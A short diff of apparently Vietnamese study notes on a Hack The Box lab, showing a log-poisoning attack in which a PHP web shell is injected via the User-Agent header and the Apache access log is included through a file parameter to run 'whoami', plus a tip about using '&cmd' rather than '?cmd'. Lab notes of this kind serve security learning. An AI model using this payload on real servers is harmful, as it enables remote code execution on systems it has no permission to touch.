@@ -22,3 +22,5 @@ Trong bài lab của HTB là như này
   GET /index.php?language=/var/log/apache2/access.log&cmd=whoami
   User-Agent: <?php system($_GET['cmd']); ?>
     -> Kết quả trả về lệnh whomai đã được thực thi 
+
+    CHÚ Ý &cmd=whoami chứ không phải ?cmd.... nhé 
